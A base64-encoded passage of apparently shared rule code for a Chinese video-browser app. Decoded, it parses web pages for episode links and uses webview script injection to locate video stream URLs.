meSh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLor6bmg4VcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS95c2Z4P3J1bGU9XFxcIiArIHJ1bGUgKyBcXFwiJnI9XFxcIiArIHJ1bGUgKyBcXFwiIyNcXFwiICsgdXJsLFxcbiAgICAgICAgICAgICAgICAgICAgfSkpXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAvL0FJ6Kej5p6QXFxuICAgICAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLm9wZW4oSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBkb2N1bWVudC50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvcD9ydWxlPVxcXCIgKyBydWxlICsgXFxcIiZyPVxcXCIgKyBydWxlICsgXFxcIiZ1PVxcXCIgKyBmeV9icmlkZ2VfYXBwLmJhc2U2NEVuY29kZSh1cmwpLFxcbiAgICAgICAgICAgICAgICAgICAgfSkpXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSk7XFxuICAgICAgICB9IGVsc2UgaWYgKCFpbnB1dC5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgICAgICBsb2coaW5wdXQpO1xcbiAgICAgICAgICAgIC8v6IO95ZSk6LW3QVBQ55qE55m95ZCN5Y2VXFxuICAgICAgICAgICAgbGV0IHdoaXRlID0gW1xcbiAgICAgICAgICAgICAgICBcXFwicWtsaW5rXFxcIixcXG4gICAgICAgICAgICAgICAgXFxcImJkbmV0ZGlza1xcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJ4dW5sZWlhcHBcXFwiXFxuICAgICAgICAgICAgXTtcXG4gICAgICAgICAgICBsZXQgaW5XaGl0ZSA9IHdoaXRlLmZpbHRlcihpdCA9PiBpbnB1dC5zdGFydHNXaXRoKGl0KSkubGVuZ3RoID4gMDtcXG4gICAgICAgICAgICBpZiAoIWluV2hpdGUpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxuICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlblRoaXJkQXBwICYmIGZ5X2JyaWRnZV9hcHAub3BlblRoaXJkQXBwKHVybCk7XFxuICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpXFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGxldCB3aGl0ZSA9IFtcXG4gICAgICAgICAgICAgICAgXFxcInVybD1cXFwiLFxcbiAgICAgICAgICAgICAgICBcXFwiZnNvdS5jb21cXFwiLFxcbiAgICAgICAgICAgICAgICBcXFwiYmluZy5cXFwiLCAgICAgICAgICAgICAgICBcXG4gICAgICAgICAgICBdO1xcbiAgICAgICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IGlucHV0LmluY2x1ZGVzKGl0KSkubGVuZ3RoID4gMDtcXG4gICAgICAgICAgICBpZiAoaW5XaGl0ZSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxldCByZWcgPSBuZXcgUmVnRXhwKFxcXCJbXFxcXHU0ZTAwLVxcXFx1OWZhNV0rXFxcIiwgXFxcImdcXFwiKTtcXG4gICAgICAgICAgICBsZXQgciA9IGRlY29kZVVSSUNvbXBvbmVudChpbnB1dCk7XFxuICAgICAgICAgICAgaWYgKHJlZy50ZXN0KHIpIHx8IChpbnB1dC5zdGFydHNXaXRoKG9yaWdpbikgJiYgaW5wdXQubGVuZ3RoIC0gb3JpZ2luLmxlbmd0aCA+IDIpKSB7XFxuICAgICAgICAgICAgICAgIC8v5pyJ5Lit5paH77yM5bqU6K+l5piv5Zyo5pCc57Si77yM6Lez5paw6aG16Z2iXFxuICAgICAgICAgICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLor6bmg4VcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS95c2Z4P3J1bGU9XFxcIiArIHJ1bGUgKyBcXFwiJnI9XFxcIiArIHJ1bGUgKyBcXFwiIyNcXFwiICsgdXJsLFxcbiAgICAgICAgICAgICAgICAgICAgfSkpO1xcbiAgICAgICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICB9LCBydWxlLCBvcmlnaW4pO1xcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6jOe6p+ino+aekFwiLFwicGF0aFwiOlwicFwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmxldCBsaXN0ID0gc3RvcmFnZTAuZ2V0SXRlbShcXFwid2hpdGVcXFwiLCBbXSk7XFxubGV0IGluV2hpdGUgPSBsaXN0LmluY2x1ZGVzKHVybCk7XFxubGV0IGQgPSBbXTtcXG5pZiAoIWluV2hpdGUpIHtcXG4gICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCk7XFxuICAgIGxldCB3ZWIgPSBnZXRJdGVtKCd3ZWInLCAnMCcpID09IFxcXCIxXFxcIjtcXG4gICAgbGV0IHJ1bGUgPSBnZXRQYXJhbShcXFwiclxcXCIpO1xcbiAgICBsZXQgcGFyc2UgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9wYXJzZVxcXCIpO1xcbiAgICBkID0gcGFyc2UocnVsZSwgd2ViLCB1cmwsIGh0bWwpO1xcbn1cXG5pZiAoZC5sZW5ndGggPT0gMCkge1xcbiAgICAvL+WMuemFjeWksei0pVxcbiAgICBsZXQgaXRlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvdVxcXCIpKGdldFBhcmFtKFxcXCJyXFxcIiksIGdldEhvbWUodXJsKSk7XFxuICAgIGxldCBqcyA9ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBpZiAoZG9jdW1lbnQudGl0bGUgJiYgZG9jdW1lbnQudGl0bGUubGVuZ3RoKSB7XFxuICAgICAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZSh0KTtcXG4gICAgICAgICAgICAgICAgfSwgZG9jdW1lbnQudGl0bGUpO1xcbiAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBsZXQganMyID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXCIpKGdldFBhcmFtKFxcXCJyXFxcIiksIHVybCk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIlxcXCIsXFxuICAgICAgICB1cmw6IHVybCxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICAgICAgZGVzYzogXFxcImZsb2F0JiYxMDAlXFxcIixcXG4gICAgICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBqczoganMgKyBcXFwiO1xcXFxuXFxcIiArIGpzMixcXG4gICAgICAgICAgICB1cmxJbnRlcmNlcHRvcjogaXRlLFxcbiAgICAgICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICAgICAgZmxvYXRWaWRlbzogdHJ1ZSxcXG4gICAgICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWVcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBpZDogdXJsXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBpZiAoIWluV2hpdGUpIHtcXG4gICAgICAgIHRvYXN0KFxcXCJBSeWMuemFjeWksei0pe+8jOW3suS9v+eUqFg15Yqg6L29XFxcIik7XFxuICAgIH1cXG4gICAgc2V0UmVzdWx0KGQpO1xcbn0gZWxzZSB7XFxuICAgIHNldFJlc3VsdChkKTtcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkuoznuqdwYXJzZVwiLFwicGF0aFwiOlwicGFyc2VcIixcInJ1bGVcIjpcIiQuZXhwb3J0cyA9IGZ1bmN0aW9uKHJ1bGUsIHdlYiwgdXJsLCBodG1sKSB7XFxuICAgIGxldCBkID0gW107XFxuXFxuICAgIGxldCBhbGlzdCA9IHBkZmEoaHRtbCwgXFxcImJvZHkmJmFcXFwiKTtcXG4gICAgbGV0IGFyciA9IGFsaXN0Lm1hcChpdCA9PiB7XFxuICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgIC8vaHRtbDogaXQsXFxuICAgICAgICAgICAgdGV4dDogcGRmaChpdCwgXFxcImEmJlRleHRcXFwiKSxcXG4gICAgICAgICAgICB0aXRsZTogcGRmaChpdCwgXFxcImEmJnRpdGxlXFxcIiksXFxuICAgICAgICAgICAgaHJlZjogcGQoaXQsIFxcXCJhJiZocmVmXFxcIiwgdXJsKVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgLy9sb2coYXJyKTtcXG4gICAgbGV0IGRlYnVnID0gZmFsc2U7XFxuXFxuICAgIGZ1bmN0aW9uIGNsZWFyVGV4dChpdCkge1xcbiAgICAgICAgcmV0dXJuIGl0LnJlcGxhY2UoL+esrHzpm4Z856ugL2csIFxcXCJcXFwiKTtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBpc01vdmllKGl0KSB7XFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgdGl0ID0gaXQudGl0bGUgfHwgXFxcIlxcXCI7XFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcIlxcXCI7XFxuICAgICAgICBpZiAoaXQgPT0gXFxcIlxcXCIgfHwgaXQubGVuZ3RoID4gOCkge1xcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgICAgIH1cXG4gICAgICAgIC8v5o6S6ZmkXFxuICAgICAgICBsZXQgcmVnID0gL1xcXFwufOmrmOa4heebtOaSrXzlhpnnnJ/mjqjojZB85b2x6ZmifOW9seinhnzok53lhYnnlLXlvbF86auY5riF55S15b2xfOesrOS4gOWto3znrKzkuozlraN856ys5LiJ5a2jfOesrOWbm+Wto3znrKzkupTlraMvO1xcbiAgICAgICAgaWYgKHRpdCAhPSBcXFwiXFxcIiAmJiAhdGl0LmluY2x1ZGVzKGl0KSB8fCByZWcudGVzdChpdCkpIHtcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXQubWF0Y2goL+WOn+eUu3zlpIfnlKh86JOd5YWJfOi2hea4hXzpq5jmuIV85q2j54mHfOmfqeeJiHw0S3w0a3wxMDgwUHw3MjBQfFRDfEhEfEJELylcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBub3RDaGFwdGVyKGl0KSB7XFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBpdC50ZXh0Lm1hdGNoKC9bMC05XVxcXFwuWzAtOV3liIYvKTtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBpc0NoYXB0ZXIoaXQsIHByZSwgbmV4dCkge1xcbiAgICAgICAgaWYgKG5vdENoYXB0ZXIoaXQpKSB7XFxuICAgICAgICAgICAgLy/kvJjlhYjmjpLpmaRcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICB9XFxuICAgICAgICAvL+WIpOaWreaYr+S4jeaYr+eUteW9sVxcbiAgICAgICAgaWYgKGlzTW92aWUoaXQpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXNDaGFwdGVyMChpdCwgcHJlKSB8fCBpc0NoYXB0ZXIwKGl0LCBuZXh0KTtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBnZXRDaGFwdGVyTnVtKGl0KSB7XFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICB9XFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcIlxcXCI7XFxuICAgICAgICBpZiAoaXQgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICB9XFxuICAgICAgICBpdCA9IGNsZWFyVGV4dChpdCk7XFxuICAgICAgICBsZXQgcmVnID0gL15bMC05XSokLztcXG4gICAgICAgIGlmICghcmVnLnRlc3QoaXQpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIC0xO1xcbiAgICAgICAgfVxcbiAgICAgICAgaXQgPSBwYXJzZUludChpdCk7XFxuICAgICAgICBpZiAoaXNOYU4oaXQpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIC0xO1xcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKGl0ID4gMTkwMCAmJiBpdCA8IDIxMDApIHtcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXQ7XFxuICAgIH1cXG5cXG4gICAgZnVuY3Rpb24gaXNDaGFwdGVyMChpdCwgYnJvdGhlcikge1xcbiAgICAgICAgLyppZiAoZGVidWcpIHtcXG4gICAgICAgICAgICBsb2coe1xcbiAgICAgICAgICAgICAgICBpdDogaXQsXFxuICAgICAgICAgICAgICAgIGJyb3RoZXI6IGJyb3RoZXJcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0qL1xcbiAgICAgICAgaXQgPSBnZXRDaGFwdGVyTnVtKGl0KTtcXG4gICAgICAgIC8vaWYgKGRlYnVnKSBsb2coaXQpO1xcbiAgICAgICAgaWYgKGl0IDwgMCkge1xcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgICAgIH1cXG4gICAgICAgIGJyb3RoZXIgPSBnZXRDaGFwdGVyTnVtKGJyb3RoZXIpO1xcbiAgICAgICAgLy9pZiAoZGVidWcpIGxvZyhicm90aGVyKTtcXG4gICAgICAgIGlmIChicm90aGVyIDwgMCkge1xcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBpdCAtIGJyb3RoZXIgPCAyICYmIGl0IC0gYnJvdGhlciA+IC0yO1xcbiAgICB9XFxuXFxuICAgIGxldCBfd2ViID0gJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICBsZXQgdXJscyA9IF9nZXRVcmxzKCk7XFxuICAgICAgICBsZXQgcmVnID0gL1xcXFwuaHRtbHxcXFxcLmNzc3xcXFxcLmpzLztcXG4gICAgICAgIGZvciAobGV0IGsgaW4gdXJscykge1xcbiAgICAgICAgICAgIGlmICghcmVnLnRlc3QodXJsc1trXSkgJiYgdXJsc1trXS5tYXRjaCgvXFxcXC5tcDR8XFxcXC5tM3U4LykpIHtcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5sb2codXJsc1trXSk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFwiXFxcIikpICsgXFxcIiNpZ25vcmVJbWc9dHJ1ZSNcXFwiO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgfSk7XFxuXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxuICAgICAgICBsZXQgdCA9IGl0LnRleHQ7XFxuICAgICAgICBpZiAoIWl0LmhyZWYgfHwgaXQuaHJlZiA9PSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IHByZSA9IGkgPT0gMCA/IG51bGwgOiBhcnJbaSAtIDFdO1xcbiAgICAgICAgbGV0IG5leHQgPSBpID09IChhcnIubGVuZ3RoIC0gMSkgPyBudWxsIDogYXJyW2kgKyAxXTtcXG4gICAgICAgIGlmIChpc0NoYXB0ZXIoaXQsIHByZSwgbmV4dCkpIHtcXG4gICAgICAgICAgICBpZiAod2ViKSB7XFxuICAgICAgICAgICAgICAgIHZhciB1cmx4ID0gXFxcIndlYlJ1bGU6Ly9cXFwiICsgaXQuaHJlZiArIFxcXCJAXFxcIiArIF93ZWI7XFxuICAgICAgICAgICAgICAgIHZhciBleHRyYXggPSB7XFxuICAgICAgICAgICAgICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWUsXFxuICAgICAgICAgICAgICAgICAgICBpZDogaXQuaHJlZixcXG4gICAgICAgICAgICAgICAgICAgIGJsb2NrUnVsZXM6IFsnLm00YScsICcubXAzJywgJy5mbHYnLCAnLmF2aScsICcuM2dwJywgJy5tcGVnJywgJy53bXYnLCAnLm1vdicsICcucm12YicsICcuZ2lmJywgJy5qcGVnJywgJy5wbmcnLCAnLmljbycsICcuc3ZnJ11cXG4gICAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICB2YXIgdXJseCA9IFxcXCJ2aWRlbzovL1xcXCIgKyBpdC5ocmVmO1xcbiAgICAgICAgICAgICAgICB2YXIgZXh0cmF4ID0ge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0LmhyZWZcXG4gICAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHQsXFxuICAgICAgICAgICAgICAgIHVybDogdXJseCxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYTogZXh0cmF4XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgaWYgKGQubGVuZ3RoID09IDApIHtcXG4gICAgICAgIHJldHVybiBkO1xcbiAgICB9IGVsc2Uge1xcblxcbiAgICAgICAgZC5zcGxpY2UoMCwgMCwge1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi8J+Ul1xcXCIgKyB1cmwsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL3lzZng/cnVsZT1cXFwiICsgcnVsZSArIFxcXCImcj1cXFwiICsgcnVsZSArIFxcXCIjI1xcXCIgKyB1cmwsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgIGRlc2M6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXCJcXFwiXFxuICAgICAgICB9KTtcXG5cXG5cXG4gICAgICAgIC8v5Li657q/6Lev5Yqg5YiG5Ymy57q/XFxuICAgICAgICBsZXQgZDIgPSBbXTtcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgIGQyLnB1c2goZFtpXSk7XFxuICAgICAgICAgICAgaWYgKGkgPCBkLmxlbmd0aCAtIDEpIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gZFtpXTtcXG4gICAgICAgICAgICAgICAgbGV0IHQxID0gcGFyc2VJbnQoY2xlYXJUZXh0KGl0LnRpdGxlKSk7XFxuICAgICAgICAgICAgICAgIGxldCBuZXh0ID0gZFtpICsgMV07XFxuICAgICAgICAgICAgICAgIGxldCB0MiA9IHBhcnNlSW50KGNsZWFyVGV4dChuZXh0LnRpdGxlKSk7XFxuICAgICAgICAgICAgICAgIGlmICh0MiAtIHQxID4gMSB8fCB0MSAtIHQyID4gMSkge1xcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJiaWdfYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJiaWdfYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIGQyLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi5Yy56YWN5pyJ6K+v77yf54K55oiR5LiN5YaN5Yy56YWN5q2k6aG16Z2iXFxcIixcXG4gICAgICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKHVybCkgPT4ge1xcbiAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5rip6aao5o+Q56S6XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IFxcXCLlpoLmnpzlj6rmmK/ljZXmrKHljLnphY3lpLHotKXvvIzngrnlh7vkuIvmlrnlj5bmtojmjInpkq7liLfmlrDpobXpnaLph43mlrDljLnphY3vvIzlpoLmnpznoa7orqTml6Dms5XljLnphY3vvIzngrnlh7vkuIvmlrnnoa7lrprmjInpkq7liqDlhaXnmb3lkI3ljZVcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgY2FuY2VsOiBcXFwicmVmcmVzaFBhZ2UoKVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKCh1cmwpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgbGlzdCA9IHN0b3JhZ2UwLmdldEl0ZW0oXFxcIndoaXRlXFxcIiwgW10pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxpc3QucHVzaCh1cmwpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0oXFxcIndoaXRlXFxcIiwgbGlzdCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5bey5Yqg5YWl55m95ZCN5Y2VXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfSwgdXJsKVxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgICAgIH0sIHVybCksXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJhdmF0YXJcXFwiLFxcbiAgICAgICAgICAgIGltZzogXFxcImhpa2VyOi8vaW1hZ2VzL2FjY291bnRcXFwiXFxuICAgICAgICB9KTtcXG4gICAgICAgIHJldHVybiBkMjtcXG4gICAgfVxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIng1QUlcIixcInBhdGhcIjpcIng1YWlcIixcInJ1bGVcIjpcIiQuZXhwb3J0cyA9IGZ1bmN0aW9uKHJ1bGUsIGFuY2hvcklkKSB7XFxuICAgIHJldHVybiAkLnRvU3RyaW5nKChydWxlLCBhbmNob3JJZCwgd2hpdGUpID0+IHtcXG4gICAgICAgIGlmICh3aW5kb3cuY2hlY2swID09IG51bGwpIHtcXG4gICAgICAgICAgICBmdW5jdGlvbiBjaGVjazAoKSB7XFxuICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgaHRtbCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoXFxcImh0bWxcXFwiKS5pbm5lckhUTUw7XFxuICAgICAgICAgICAgICAgICAgICBmYmEucHV0VmFyKFxcXCJodG1sMFxcXCIsIGh0bWwpO1xcbiAgICAgICAgICAgICAgICAgICAgZmJhLnBhcnNlTGF6eVJ1bGVBc3luYygkJCQoKS5sYXp5UnVsZSgocnVsZSwgdXJsLCBhbmNob3JJZCwgd2hpdGUpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0cnkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZCA9IFtdO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgaHRtbCA9IGdldFZhcihcXFwiaHRtbDBcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFyVmFyKFxcXCJodG1sMFxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgd2ViID0gZmFsc2U7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghd2hpdGUuaW5jbHVkZXModXJsKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBhcnNlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvcGFyc2U/cnVsZT1cXFwiICsgcnVsZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gcGFyc2UocnVsZSwgd2ViLCB1cmwsIGh0bWwpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkLmxlbmd0aCA8IDEpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcImJvZHkmJmlmcmFtZVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhcnIubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgc3JjID0gcGRmaChhcnJbMF0sIFxcXCJpZnJhbWUmJnNyY1xcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coXFxcIuiOt+WPluWIsGlmcmFtZe+8mlxcXCIgKyBzcmMpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXdoaXRlLmluY2x1ZGVzKHNyYykpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzcmMgJiYgc3JjLnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSAmJiAhc3JjLm1hdGNoKC9cXFxcLm1wNHxcXFxcLm0zdTh8XFxcXC5tcDN8XFxcXC5mbHZ8XFxcXC5ta3YvKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0bWwgPSByZXF1ZXN0KHNyYyk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCA9IHBhcnNlKHJ1bGUsIHdlYiwgc3JjLCBodG1sKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coXFxcIuWwneivleiOt+WPlmlmcmFtZeWksei0pVx